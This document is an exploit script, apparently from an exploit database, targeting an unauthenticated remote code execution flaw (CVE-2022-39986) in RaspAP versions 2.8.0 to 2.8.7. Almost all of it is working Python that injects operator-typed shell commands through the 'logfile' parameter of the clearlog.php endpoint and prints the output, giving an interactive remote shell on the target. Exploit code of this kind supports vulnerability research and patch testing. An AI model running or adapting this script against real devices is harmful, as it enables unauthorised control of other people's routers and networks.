# Exploit Title: RaspAP - Remote Code Execution (RCE) (Unauthenticated)
# Date: Aug 2022
# CVE-ID: CVE-2022–39986
# Author: Ismael0x00 <https://twitter.com/ismael0x00>
# Vendor Homepage: https://raspap.com/
# Software Link: https://github.com/RaspAP/raspap-webgui
# Version: 2.8.0>=2.8.7
# Tested on: Linux raspberrypi 5.10.*

import requests
from requests.api import post
import sys, re

if len(sys.argv) != 3:
    print("python3 attack.py <target-host> <target-port>")
    sys.exit()
else:  
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    

    endpoint = "ajax/logging/clearlog.php"
    url = "http://{}:{}/{}".format(target_host,target_port,endpoint)

    while(True):
        cmd = input("Please enter a command:\n")
        command = ";"+cmd+";"
        s = requests.Session()
        post_data = {
            "idk" : "fucck",
            "logfile": command,
            "fuck": "shit"
        }
        post_Request = s.post(url, data=post_data)
        if post_Request.status_code==200:
            print("[*] Sending command ... ")
            print(post_Request.text)
            print("Done")
        else:
            print("Error.["+post_Request.text+"]")